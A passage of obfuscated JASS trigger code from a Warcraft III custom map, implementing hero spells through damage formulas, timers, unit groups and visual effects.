endif
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
call CreateNUnitsAtLoc(1,$68303359,GetOwningPlayer(GetTriggerUnit()),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10],bj_UNIT_FACING)
call IssueTargetOrderBJ(GetLastCreatedUnit(),"creepthunderbolt",Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call SetUnitFlyHeight(GetLastCreatedUnit(),0.,0.)
if sX() then
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,255,255)
else
call SetUnitVertexColor(GetLastCreatedUnit(),255,0,0,255)
endif
call TriggerSleepAction(.5)
call SetUnitPositionLocFacingLocBJ(GetTriggerUnit(),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call SetUnitPositionLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call UnitDamageTargetBJ(GetTriggerUnit(),Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],I2R(GetUnitAbilityLevel(GetTriggerUnit(),$4130524C))*((I2R(GetHeroAgi(GetTriggerUnit(),true))+I2R(GetHeroInt(GetTriggerUnit(),true)))/2.)*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call TriggerSleepAction(4.)
call SetUnitPositionLoc(Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10])
call SetUnitPositionLoc(GetTriggerUnit(),Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
if sY() then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\ShadowAssault.mdx",Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10]))
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\ShadowAssault.mdx",Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]))
else
endif
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function sZ))
call ForGroupBJ(SR,function sa)
call DestroyGroup(SR)
set Wb[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=null
call RemoveLocation(Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call RemoveLocation(Wc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+10])
else
endif
endfunction
function sd takes nothing returns nothing
set WZ=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WZ,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(WZ,function sc)
endfunction
function se takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call UnitRemoveAbility(Hu,$4130535A)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305339,true)
call RemoveUnit(UZ[GetPlayerId(GetOwningPlayer(Hu))])
set UZ[GetPlayerId(GetOwningPlayer(Hu))]=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
set Hu=null
endfunction
function sf takes nothing returns nothing
local unit Hu=GetEnumUnit()
local real MD=GetUnitX(Pq)
local real ME=GetUnitY(Pq)
local real Pt=GetUnitX(Hu)
local real Pu=GetUnitY(Hu)
local real NT=Atan2(ME-Pu,MD-Pt)
local real Pw=nR(GetUnitX(Hu)-10*Cos(NT))
local real Px=nS(GetUnitY(Hu)-10*Sin(NT))
local location Ht=Location(Pw,Px)
local string Mc
if nT(Ht,Location(MD,ME))<=500 then
call SetUnitPositionLoc(Hu,Ht)
set Mc=""
if GetOwningPlayer(Pq)==GetLocalPlayer() then
set Mc="Abilities\\Weapons\\AncientProtectorMissile\\AncientProtectorMissile.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(Mc,Ht))
endif
call RemoveLocation(Ht)
set Ht=null
set Hu=null
endfunction
function sg takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local group Na=LoadGroupHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Pq=Hu
call ForGroup(Na,function sf)
else
call DestroyGroup(Na)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set Na=null
endfunction
function sh takes nothing returns nothing
local unit Nv=GetEnumUnit()
local location Ht=GetUnitLoc(Nv)
local unit NQ
call m1(Pq,Nv,Nu)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call nD(NQ,1)
call UnitAddAbility(NQ,$41305232)
call IssueTargetOrder(NQ,"curse",Nv)
call RemoveLocation(Ht)
set NQ=null
set Nv=null
set Ht=null
endfunction
function si takes nothing returns nothing
local unit Nv=GetEnumUnit()
local location Ht=GetUnitLoc(Nv)
local unit NQ
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Effect_Shadow_Assault_Mini.mdx",Ht))
call m1(Pq,Nv,Nu)
set NQ=CreateUnitAtLoc(Player(0),$68303739,Ht,0)
call nD(NQ,1)
call UnitAddAbility(NQ,$4131324E)
call IssueTargetOrder(NQ,"creepthunderbolt",Nv)
call RemoveLocation(Ht)
set NQ=null
set Nv=null
set Ht=null
endfunction
function sj takes unit Hu returns nothing
local location Ht=GetUnitLoc(Hu)
local group V9=CreateGroup()
local boolexpr Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),250,Nb)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$41305048)>=1 then
set Nu=R2I(I2R(200*GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41305048)+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*5)*Nd[GetPlayerId(GetOwningPlayer(MT[GetPlayerId(GetOwningPlayer(Hu))]))+1])
else
set Nu=R2I(I2R(2000+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*9)*Nd[GetPlayerId(GetOwningPlayer(MT[GetPlayerId(GetOwningPlayer(Hu))]))+1])
endif
call ForGroup(V9,function si)
call DestroyGroup(V9)
call DestroyBoolExpr(Nb)
call RemoveLocation(Ht)
set V9=null
set Nb=null
set Ht=null
endfunction
function sk takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local location Mc
local location No
local string Np
local group Nt
local boolexpr Ny
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Mc=GetUnitLoc(Hu)
set No=nU(Mc,10,GetUnitFacing(Hu))
call SetUnitPositionLoc(Hu,No)
set Np=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Np="war3mapImported\\SoulshotD-gradeTarget.mdl"
endif
call DestroyEffect(AddSpecialEffectLoc(Np,Mc))
set Nt=CreateGroup()
set Ny=Condition(function mx)
call GroupEnumUnitsInRange(Nt,GetLocationX(Mc),GetLocationY(Mc),85,Ny)
if CountUnitsInGroup(Nt)>0 then
call sj(Hu)
call UnitRemoveAbility(Hu,$41305038)
call DestroyGroup(Nt)
call DestroyBoolExpr(Ny)
set Nt=null
set Ny=null
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call DestroyGroup(Nt)
call DestroyBoolExpr(Ny)
set Nt=null
set Ny=null
call RemoveLocation(Mc)
call RemoveLocation(No)
set Mc=null
set No=null
else
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
endfunction
function sl takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41305038)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function sm takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local integer L9=50*GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$4130504D)+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)/4
local timer Hc
call nj(Nv,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\darkbirth.mdx",Nv,"origin"))
call TimerStart(Hc,7,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function sn takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local timer Hc
local group Na
local location Ht
local boolexpr Vx
local integer L9
local string Mc
if GetSpellAbilityId()==$41305037 or GetSpellAbilityId()==$41305145 then
set Hc=CreateTimer()
call UnitAddAbility(Hu,$41305038)
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,2.5,false,function sl)
set Hc=null
if UZ[GetPlayerId(GetOwningPlayer(Hu))]!=null then
call UnitAddAbility(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId())
set L9=GetUnitAbilityLevel(Hu,GetSpellAbilityId())
call SetUnitAbilityLevel(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId(),L9)
call IssueImmediateOrder(UZ[GetPlayerId(GetOwningPlayer(Hu))],"battleroar")
endif
elseif GetSpellAbilityId()==$4130504D then
set L9=50*GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$4130504D)+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)/4
call nj(Hu,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Hu)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call TimerStart(Hc,7,true,function nE)
set Hc=null
set Na=CreateGroup()
set Ht=GetUnitLoc(Hu)
set Vx=Condition(function mv)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),450,Vx)
call ForGroup(Na,function sm)
call DestroyBoolExpr(Vx)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
if UZ[GetPlayerId(GetOwningPlayer(Hu))]!=null then
call UnitAddAbility(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId())
set L9=GetUnitAbilityLevel(Hu,GetSpellAbilityId())
call SetUnitAbilityLevel(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId(),L9)
call IssueImmediateOrder(UZ[GetPlayerId(GetOwningPlayer(Hu))],"frenzy")
endif
elseif GetSpellAbilityId()==$41305048 or GetSpellAbilityId()==$41305144 then
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveInteger(Nq,GetHandleId(Hc),1,71)
call TimerStart(Hc,.005,true,function sk)
set Hc=null
if UZ[GetPlayerId(GetOwningPlayer(Hu))]!=null then
call UnitAddAbility(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId())
set L9=GetUnitAbilityLevel(Hu,GetSpellAbilityId())
call SetUnitAbilityLevel(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId(),L9)
call IssueImmediateOrder(UZ[GetPlayerId(GetOwningPlayer(Hu))],"windwalk")
endif
elseif GetSpellAbilityId()==$4130505A or GetSpellAbilityId()==$41305157 then
set Na=CreateGroup()
set Ht=GetUnitLoc(Hu)
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\Arcane Explosion.mdx"
endif
call DestroyEffect(AddSpecialEffectLoc(Mc,Ht))
set Vx=Condition(function mx)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),250,Vx)
call DestroyBoolExpr(Vx)
call RemoveLocation(Ht)
set Pq=Hu
if GetUnitAbilityLevel(Hu,$4130505A)>=1 then
set Nu=R2I(I2R(200*GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$4130505A)+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*3)*Nd[GetPlayerId(GetOwningPlayer(MT[GetPlayerId(GetOwningPlayer(Hu))]))+1])
else
set Nu=R2I(I2R(2000+GetHeroAgi(MT[GetPlayerId(GetOwningPlayer(Hu))],true)*6)*Nd[GetPlayerId(GetOwningPlayer(MT[GetPlayerId(GetOwningPlayer(Hu))]))+1])
endif
call ForGroup(Na,function sh)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveGroupHandle(Nq,GetHandleId(Hc),2,Na)
call SaveInteger(Nq,GetHandleId(Hc),1,31)
call TimerStart(Hc,.005,true,function sg)
set Hc=null
set Ht=null
set Vx=null
if UZ[GetPlayerId(GetOwningPlayer(Hu))]!=null then
call UnitAddAbility(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId())
set L9=GetUnitAbilityLevel(Hu,GetSpellAbilityId())
call SetUnitAbilityLevel(UZ[GetPlayerId(GetOwningPlayer(Hu))],GetSpellAbilityId(),L9)
call IssueImmediateOrder(UZ[GetPlayerId(GetOwningPlayer(Hu))],"controlmagic")
endif
elseif GetSpellAbilityId()==$41305339 then
set Ht=GetSpellTargetLoc()
set UZ[GetPlayerId(GetOwningPlayer(Hu))]=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303442,Ht,0)
set L9=GetHeroAgi(Hu,true)*2
call nj(UZ[GetPlayerId(GetOwningPlayer(Hu))],L9)
call RemoveLocation(Ht)
set Ht=null
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305339,false)
call UnitAddAbility(Hu,$4130535A)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call TimerStart(Hc,15,false,function se)
set Hc=null
elseif GetSpellAbilityId()==$4130535A then
call IssueTargetOrder(UZ[GetPlayerId(GetOwningPlayer(Hu))],"attack",GetSpellTargetUnit())
endif
set Na=null
set Hu=null
endfunction
function so takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function sn)
set Hc=null
endfunction
function sp takes nothing returns nothing
local unit Mc
local location No
local unit Np
local unit Nt
local integer Ny
local integer Ot
local integer Ou
if GetSpellAbilityId()==$41314432 then
set Mc=GetTriggerUnit()
set No=GetUnitLoc(Mc)
set Np=CreateUnitAtLoc(GetOwningPlayer(Mc),$7530304E,No,0)
set Nt=GetSpellTargetUnit()
call IssueTargetOrder(Np,"attack",Nt)
call UnitApplyTimedLife(Np,$42544C46,15)
set Ny=GetPlayerId(GetOwningPlayer(Mc))+1
set Ot=GetHeroInt(Mc,true)*3+GetUnitAbilityLevel(Mc,$41314432)*100
set Ou=Ot+Ot*(UM[Ny]/100)
call nj(Np,Ou)
call RemoveLocation(No)
set No=null
set Nt=null
endif
set Np=null
set Mc=null
endfunction
function sq takes nothing returns nothing
set Wd=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wd,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wd,function sp)
endfunction
function sr takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D53) then
return false
endif
return true
endfunction
function ss takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303258
endfunction
function st takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function su takes nothing returns nothing
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303258,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssuePointOrderLoc(GetLastCreatedUnit(),"rainoffire",V0)
call RemoveLocation(V0)
call TriggerSleepAction(6.)
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function ss))
call ForGroupBJ(SR,function st)
call DestroyGroup(SR)
endfunction
function sv takes nothing returns nothing
set We=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(We,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(We,Condition(function sr))
call TriggerAddAction(We,function su)
endfunction
function sw takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D59) then
return false
endif
return true
endfunction
function sx takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())==$68303258
endfunction
function sy takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function sz takes nothing returns nothing
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$68303258,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
call IssuePointOrderLoc(GetLastCreatedUnit(),"rainoffire",V0)
call RemoveLocation(V0)
call TriggerSleepAction(6.)
set SR=GetUnitsOfPlayerMatching(GetOwningPlayer(GetTriggerUnit()),Condition(function sx))
call ForGroupBJ(SR,function sy)
call DestroyGroup(SR)
endfunction
function s0 takes nothing returns nothing
set Wf=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wf,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(Wf,Condition(function sw))
call TriggerAddAction(Wf,function sz)
endfunction
function s1 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function s2 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*3.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function s3 takes nothing returns boolean
if UnitHasBuffBJ(GetEnumUnit(),$42303345)==true then
return true
endif
if UnitHasBuffBJ(GetEnumUnit(),$42303346)==true then
return true
endif
return false
endfunction
function s4 takes nothing returns boolean
if not s3() then
return false
endif
return true
endfunction
function s5 takes nothing returns nothing
if s4() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*(3.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
endfunction
function s6 takes nothing returns boolean
if not (GetSpellAbilityId()==$41303954) then
return false
endif
return true
endfunction
function s7 takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function s8 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*6.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function s9 takes nothing returns boolean
if UnitHasBuffBJ(GetEnumUnit(),$42303345)==true then
return true
endif
if UnitHasBuffBJ(GetEnumUnit(),$42303346)==true then
return true
endif
return false
endfunction
function tB takes nothing returns boolean
if not s9() then
return false
endif
return true
endfunction
function tC takes nothing returns nothing
if tB() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*(3.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
endfunction
function tD takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D58) then
return false
endif
return true
endfunction
function tE takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function tF takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41304D50))*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function tG takes nothing returns boolean
if UnitHasBuffBJ(GetEnumUnit(),$42303345)==true then
return true
endif
if UnitHasBuffBJ(GetEnumUnit(),$42303346)==true then
return true
endif
return false
endfunction
function tH takes nothing returns boolean
if not tG() then
return false
endif
return true
endfunction
function tI takes nothing returns nothing
if tH() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*(3.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
endfunction
function tJ takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D50) then
return false
endif
return true
endfunction
function tK takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function tL takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*20.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
endfunction
function tM takes nothing returns boolean
if UnitHasBuffBJ(GetEnumUnit(),$42303345)==true then
return true
endif
if UnitHasBuffBJ(GetEnumUnit(),$42303346)==true then
return true
endif
return false
endfunction
function tN takes nothing returns boolean
if not tM() then
return false
endif
return true
endfunction
function tO takes nothing returns nothing
if tN() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))*(3.*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
endfunction
function tP takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D57) then
return false
endif
return true
endfunction
function tQ takes nothing returns boolean
if not (GetSpellAbilityId()==$41304D51) then
return false
endif
return true
endfunction
function tR takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_MAGIC_IMMUNE)==false
endfunction
function tS takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function tT takes nothing returns boolean
return GetBooleanAnd(tR(),tS())
endfunction
function tU takes nothing returns boolean
if not (GetSpellAbilityId()==$41303042) then
return false
endif
return true
endfunction
function tV takes nothing returns nothing
if s6() then
set WX=GetUnitLoc(GetTriggerUnit())
set V0=PolarProjectionBJ(WX,350.,GetUnitFacing(GetTriggerUnit()))
set SR=GetUnitsInRangeOfLocMatching(400.,V0,Condition(function s1))
call ForGroupBJ(SR,function s2)
call ForGroupBJ(SR,function s5)
call DestroyGroup(SR)
call RemoveLocation(WX)
call RemoveLocation(V0)
else
endif
if tD() then
set WX=GetUnitLoc(GetTriggerUnit())
set V0=PolarProjectionBJ(WX,350.,GetUnitFacing(GetTriggerUnit()))
set SR=GetUnitsInRangeOfLocMatching(400.,V0,Condition(function s7))
call ForGroupBJ(SR,function s8)
call ForGroupBJ(SR,function tC)
call DestroyGroup(SR)
call RemoveLocation(WX)
call RemoveLocation(V0)
else
endif
if tJ() then
set WX=GetSpellTargetLoc()
set SR=GetUnitsInRangeOfLocMatching(500.,WX,Condition(function tE))
call ForGroupBJ(SR,function tF)
call ForGroupBJ(SR,function tI)
call DestroyGroup(SR)
call RemoveLocation(WX)
else
endif
if tP() then
set WX=GetSpellTargetLoc()
set SR=GetUnitsInRangeOfLocMatching(500.,WX,Condition(function tK))
call ForGroupBJ(SR,function tL)
call ForGroupBJ(SR,function tO)
call DestroyGroup(SR)
call RemoveLocation(WX)
else
endif
if tQ() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroInt(GetTriggerUnit(),true))/2.*(I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41304D51))*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
else
endif
if tU() then
set Wh[999]=GetSpellTargetUnit()
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=3
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set WX=GetUnitLoc(Wh[999])
set SR=GetUnitsInRangeOfLocMatching(400.,WX,Condition(function tT))
set Wi[333]=GroupPickRandomUnit(SR)
call UnitDamageTargetBJ(GetTriggerUnit(),Wi[333],(I2R(GetHeroInt(GetTriggerUnit(),true))*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41303042))+I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41303042))*700.)*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_NORMAL,DAMAGE_TYPE_MAGIC)
call AddSpecialEffectTargetUnitBJ("overhead",Wi[333],"Abilities\\Spells\\Undead\\FrostNova\\FrostNovaTarget.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call DestroyGroup(SR)
call RemoveLocation(WX)
call TriggerSleepAction(.5)
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function tW takes nothing returns nothing
set Wg=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wg,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Wg,function tV)
endfunction
function tX takes nothing returns boolean
if not (GetSpellAbilityId()==$41303032) then
return false
endif
return true
endfunction
function tY takes nothing returns boolean
return IsPlayerEnemy(GetOwningPlayer(GetFilterUnit()),GetOwningPlayer(GetSpellAbilityUnit()))==true
endfunction
function tZ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function ta takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function tb takes nothing returns boolean
return GetBooleanAnd(tZ(),ta())
endfunction
function tc takes nothing returns nothing
call UnitDamageTargetBJ(Wk,GetEnumUnit(),QK*N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL)
call SetUnitLifeBJ(Wk,GetUnitStateSwap(UNIT_STATE_LIFE,Wk)+SJ[0]*Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])
call AddSpecialEffectTargetUnitBJ("chest",GetEnumUnit(),"Abilities\\Spells\\Orc\\FeralSpirit\\feralspirittarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call IssueTargetOrderBJ(GetEnumUnit(),"attack",Wk)
endfunction
function td takes nothing returns nothing
set Wk=GetSpellAbilityUnit()
set Wl=GetUnitLoc(Wk)
set QJ=CountUnitsInGroup(GetUnitsInRangeOfLocMatching(600.,Wl,Condition(function tY)))
set QK=25.+I2R(GetHeroInt(Wk,true))*I2R(GetUnitAbilityLevelSwapped($41303032,Wk))+0.
set QL=GetUnitsInRangeOfLocMatching(600.,Wl,Condition(function tb))
set SJ[0]=I2R(GetHeroInt(Wk,true))*2.
call ForGroupBJ(QL,function tc)
call CreateTextTagUnitBJ("+"+I2S(R2I(SJ[0]*Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])),Wk,0,10.,0.,100,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.5)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),1.5)
set Wk=null
set Wl=null
set QJ=0
set QK=0.
set QL=null
set SJ[0]=0.
call RemoveLocation(Wl)
call DestroyGroup(QL)
call UnitAddAbility(GetTriggerUnit(),$41305346)
call SetUnitAbilityLevel(GetTriggerUnit(),$41305346,GetUnitAbilityLevel(GetTriggerUnit(),$41303032))
call TriggerSleepAction(4.)
call UnitRemoveAbility(GetTriggerUnit(),$41305346)
endfunction
function te takes nothing returns nothing
set Wj=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Wj,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(Wj,Condition(function tX))
call TriggerAddAction(Wj,function td)
endfunction
function tf takes nothing returns boolean
if not (GetSpellAbilityId()==$41304654) then
return false
endif
return true
endfunction
function tg takes nothing returns boolean
return IsPlayerEnemy(GetOwningPlayer(GetFilterUnit()),GetOwningPlayer(GetSpellAbilityUnit()))==true
endfunction
function th takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
